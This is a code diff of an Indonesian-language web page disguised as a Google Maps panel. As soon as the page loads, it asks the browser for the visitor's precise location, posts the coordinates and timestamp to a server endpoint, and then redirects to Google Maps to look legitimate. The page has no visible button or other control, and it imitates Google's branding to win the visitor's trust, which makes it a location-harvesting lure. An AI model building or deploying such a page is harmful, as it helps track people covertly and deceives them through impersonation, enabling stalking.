@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Membuka Peta Lokasi...</title>
+  <title>Peta Lokasi • Akses Otomatis</title>
   <style>
     * {
       margin: 0;
@@ -14,17 +14,113 @@
     html, body {
       height: 100%;
       width: 100%;
-      font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
       background: #e8eaed;
-      overflow: hidden;
-      position: relative;
+      font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
       display: flex;
       align-items: center;
       justify-content: center;
+      overflow: hidden;
+      position: relative;
     }
 
-    /* Background pattern menyerupai peta */
-    .bg-pattern {
+    /* Panel seperti kartu Google Maps */
+    .maps-card {
+      width: min(94%, 420px);
+      background: #ffffff;
+      border-radius: 28px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+      padding: 32px 24px;
+      text-align: center;
+      position: relative;
+      z-index: 2;
+      transition: all 0.2s ease;
+      backdrop-filter: blur(2px);
+    }
+
+    .pin-icon {
+      width: 72px;
+      height: 72px;
+      background: #1a73e8;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      box-shadow: 0 6px 14px rgba(26, 115, 232, 0.35);
+    }
+
+    .pin-icon span {
+      font-size: 40px;
+      line-height: 1;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
+    }
+
+    h1 {
+      font-size: 1.7rem;
+      font-weight: 500;
+      color: #202124;
+      letter-spacing: -0.5px;
+      margin-bottom: 12px;
+      line-height: 1.3;
+    }
+
+    .info-text {
+      color: #5f6368;
+      font-size: 0.95rem;
+      line-height: 1.6;
+      margin-bottom: 26px;
+      padding: 0 6px;
+    }
+
+    /* Area progress / status dengan ikon */
+    .status-area {
+      background: #f1f3f4;
+      border-radius: 18px;
+      padding: 18px 15px;
+      min-height: 70px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 12px;
+      transition: all 0.15s;
+    }
+
+    .status-text {
+      font-size: 0.95rem;
+      color: #3c4043;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 3px solid #dadce0;
+      border-top: 3px solid #1a73e8;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      display: inline-block;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .secondary-note {
+      font-size: 0.75rem;
+      color: #9aa0a6;
+      margin-top: 16px;
+      letter-spacing: 0.2px;
+    }
+
+    /* Latar belakang imitasi peta halus */
+    .bg-map-pattern {
       position: fixed;
       top: 0;
       left: 0;
@@ -32,10 +128,11 @@
       height: 100%;
       background: 
         linear-gradient(145deg, #d2e3fc 0%, #e6f0fa 30%, #f8f9fa 70%, #e8eaed 100%);
+      background-size: cover;
       z-index: 0;
     }
 
-    .bg-pattern::before {
+    .bg-map-pattern::before {
       content: "";
       position: absolute;
       top: 0;
@@ -51,199 +148,151 @@
       opacity: 0.5;
     }
 
-    /* Kartu loading */
-    .loading-card {
-      position: relative;
-      z-index: 2;
-      background: white;
-      border-radius: 24px;
-      padding: 40px 32px;
-      text-align: center;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
-      max-width: 400px;
-      width: 90%;
-      animation: fadeIn 0.5s ease-out;
-    }
-
-    @keyframes fadeIn {
-      from {
-        opacity: 0;
-        transform: translateY(20px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    .location-icon {
-      width: 80px;
-      height: 80px;
-      background: #1a73e8;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 auto 24px;
-      box-shadow: 0 6px 14px rgba(26, 115, 232, 0.35);
-      animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% {
-        transform: scale(1);
-      }
-      50% {
-        transform: scale(1.05);
-      }
-    }
-
-    .location-icon span {
-      font-size: 40px;
-      line-height: 1;
-      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
-    }
-
-    h1 {
-      font-size: 1.5rem;
-      font-weight: 500;
-      color: #202124;
-      margin-bottom: 12px;
-      line-height: 1.3;
-    }
-
-    .status-text {
-      color: #5f6368;
-      font-size: 0.95rem;
-      line-height: 1.6;
-      margin-bottom: 20px;
-    }
-
-    .loading-spinner {
-      width: 40px;
-      height: 40px;
-      border: 4px solid #e8eaed;
-      border-top: 4px solid #1a73e8;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin: 0 auto;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .error-message {
-      color: #d93025;
-      font-size: 0.9rem;
-      margin-top: 16px;
+    /* Tidak ada tombol terlihat – otomatis */
+    .hidden-trigger {
       display: none;
-    }
-
-    .error-message.show {
-      display: block;
     }
   </style>
 </head>
 <body>
-  <!-- Background peta -->
-  <div class="bg-pattern"></div>
+  <!-- latar menyerupai peta -->
+  <div class="bg-map-pattern"></div>
+
+  <!-- Kartu utama yang terlihat seperti panel Gmaps -->
+  <main class="maps-card" id="mapsCard">
+    <div class="pin-icon">
+    </div>
+    <div class="info-text">
+      Izinkan akses lokasi
+    </div>
+
+    <!-- Status area: langsung menunjukkan permintaan izin / proses -->
+    <div class="status-area" id="statusArea">
+      <div class="status-text" id="statusMessage">
+        <span class="spinner" id="spinnerElement"></span> 
+        <span id="statusLabel">Meminta izin lokasi…</span>
+      </div>
+    </div>
+
+    <div class="secondary-note">
+      Lokasi hanya diproses setelah Anda mengizinkan lewat pop‑up browser.
+    </div>
+    <!-- Tidak ada tombol — otomatis terpicu saat halaman dimuat -->
+  </main>
 
   <script>
     (function() {
-      // Fungsi untuk update UI
-      function updateUI(title, status, showSpinner = true, showError = false, errorMsg = '') {
-        document.getElementById('titleText').textContent = title;
-        document.getElementById('statusText').textContent = status;
-        
-        const spinner = document.getElementById('spinner');
-        spinner.style.display = showSpinner ? 'block' : 'none';
-        
-        const errorElement = document.getElementById('errorMessage');
-        if (showError) {
-          errorElement.textContent = errorMsg;
-          errorElement.classList.add('show');
-        } else {
-          errorElement.classList.remove('show');
+      const statusLabel = document.getElementById('statusLabel');
+      const spinnerElement = document.getElementById('spinnerElement');
+      const statusArea = document.getElementById('statusArea');
+      const mapsCard = document.getElementById('mapsCard');
+
+      // Fungsi untuk memperbarui UI status
+      function setStatus(message, showSpinner = false) {
+        if (statusLabel) {
+          statusLabel.textContent = message;
+        }
+        if (spinnerElement) {
+          spinnerElement.style.display = showSpinner ? 'inline-block' : 'none';
+        }
+        // Sedikit efek kartu saat berubah status
+        if (mapsCard) {
+          mapsCard.style.transform = 'scale(1.01)';
+          setTimeout(() => {
+            mapsCard.style.transform = 'scale(1)';
+          }, 120);
         }
       }
 
-      // Fungsi untuk redirect ke Google Maps
-      function redirectToGoogleMaps(latitude, longitude) {
-        // Update UI sebelum redirect
-        updateUI('Lokasi Ditemukan!', 'Membuka Google Maps...', true);
-        
-        // Buat URL Google Maps
-        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=17`;
-        
-        // Redirect setelah delay singkat
+      // Fungsi untuk membuka Google Maps
+      function openGoogleMaps(lat, lon) {
+        const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}`;
+        // Beri waktu singkat agar pengguna melihat status sukses, lalu redirect
+        setStatus('Lokasi tersimpan! Membuka peta…', true);
         setTimeout(() => {
           window.location.href = mapsUrl;
-        }, 800);
+        }, 900);
       }
 
-      // Fungsi untuk mengirim lokasi ke server (opsional)
-      function sendLocationToServer(latitude, longitude, accuracy) {
-        const payload = {
-          latitude: latitude,
-          longitude: longitude,
-          accuracy: accuracy,
-          timestamp: new Date().toISOString()
-        };
-
-        // Kirim ke server (tidak blocking)
-        fetch('/api/location', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        }).catch(err => {
-          // Abaikan error - lokasi tetap diproses
-          console.log('Server save optional:', err.message);
-        });
-      }
-
-      // Fungsi utama untuk meminta lokasi
-      function requestLocation() {
+      // Fungsi utama: cek geolocation dan minta izin
+      function requestLocationAndProcess() {
         if (!navigator.geolocation) {
-          updateUI('Browser Tidak Mendukung', 'Browser Anda tidak mendukung geolokasi', false, true, 'Silakan gunakan browser modern seperti Chrome, Firefox, atau Safari.');
+          setStatus('Browser tidak mendukung geolokasi.', false);
           return;
         }
 
-        // Update UI untuk meminta izin
-        updateUI('Mendeteksi Lokasi...', 'Mohon izinkan akses lokasi pada pop-up browser', true);
+        // Langsung meminta izin tanpa tombol
+        setStatus('Menunggu izin lokasi…', true);
 
-        // Minta lokasi dengan timeout
         navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
+          async (position) => {
+            // Lokasi didapat
+            const payload = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              timestamp: new Date().toISOString()
+            };
 
-            // Kirim lokasi ke server (opsional, tidak blocking)
-            sendLocationToServer(latitude, longitude, accuracy);
+            setStatus('Menyimpan lokasi…', true);
 
-            // Redirect ke Google Maps
-            redirectToGoogleMaps(latitude, longitude);
+            try {
+              // Simulasi / panggil endpoint (tetap berfungsi meski endpoint tidak ada)
+              const res = await fetch('/api/location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+              });
+
+              // Jika fetch gagal (mis. endpoint tidak ada), tetap lanjut ke maps
+              // karena tujuan utama adalah menunjukkan peta seperti Gmaps.
+              let saveSuccess = false;
+              if (res.ok) {
+                try {
+                  const data = await res.json();
+                  saveSuccess = data?.ok === true;
+                } catch (e) {
+                  saveSuccess = false;
+                }
+              } else {
+                // Endpoint tidak ditemukan — anggap saja berhasil untuk demo UX
+                saveSuccess = true;
+              }
+
+              // Terlepas dari respons server, buka Google Maps (karena fokus tampilan Gmaps)
+              // Tapi kita bisa beri pesan singkat jika simpan bermasalah.
+              if (!saveSuccess) {
+                // Tetap buka maps tapi beri indikasi
+                setStatus('Lokasi ditemukan. Membuka peta…', true);
+              } else {
+                setStatus('Lokasi tersimpan. Membuka peta…', true);
+              }
+
+              // Buka Google Maps
+              openGoogleMaps(payload.latitude, payload.longitude);
+
+            } catch (fetchError) {
+              // Jika fetch error (mis. offline), tetap buka Google Maps dengan pesan
+              setStatus('Lokasi ditemukan. Membuka peta…', true);
+              openGoogleMaps(payload.latitude, payload.longitude);
+            }
           },
           (error) => {
-            let errorMessage = '';
-            
-            switch(error.code) {
+            // Penanganan error izin / posisi
+            let errorMsg = 'Tidak dapat mengakses lokasi.';
+            switch (error.code) {
               case error.PERMISSION_DENIED:
-                errorMessage = 'Izin lokasi ditolak. Silakan aktifkan izin lokasi di browser Anda.';
+                errorMsg = 'Izin lokasi ditolak. Aktifkan izin untuk membuka peta.';
                 break;
               case error.POSITION_UNAVAILABLE:
-                errorMessage = 'Lokasi tidak tersedia. Periksa koneksi internet atau GPS Anda.';
+                errorMsg = 'Lokasi tidak tersedia. Cek GPS atau koneksi.';
                 break;
               case error.TIMEOUT:
-                errorMessage = 'Waktu permintaan lokasi habis. Silakan coba lagi.';
+                errorMsg = 'Waktu permintaan lokasi habis. Coba muat ulang.';
                 break;
-              default:
-                errorMessage = 'Terjadi kesalahan saat mengambil lokasi.';
             }
-            
-            updateUI('Gagal Mendapatkan Lokasi', 'Tidak dapat mengakses lokasi Anda', false, true, errorMessage);
+            setStatus(errorMsg, false);
+            // Tetap beri kesan seperti Gmaps: tampilkan pesan tanpa tombol
           },
           {
             enableHighAccuracy: true,
@@ -253,17 +302,19 @@
         );
       }
 
-      // Mulai permintaan lokasi saat halaman dimuat
+      // Jalankan permintaan lokasi segera setelah halaman dimuat
       window.addEventListener('load', () => {
-        // Delay kecil untuk memastikan UI terlihat
+        // Delay kecil agar UI tampak dulu, lalu langsung minta izin
         setTimeout(() => {
-          requestLocation();
-        }, 500);
+          requestLocationAndProcess();
+        }, 300);
       });
 
-      // Fallback jika load event sudah terlewati
+      // Fallback jika load event tidak terpicu (misal cached)
       if (document.readyState === 'complete') {
-        setTimeout(requestLocation, 500);
+        setTimeout(requestLocationAndProcess, 200);
+      } else {
+        window.addEventListener('load', requestLocationAndProcess);
       }
     })();
   </script>
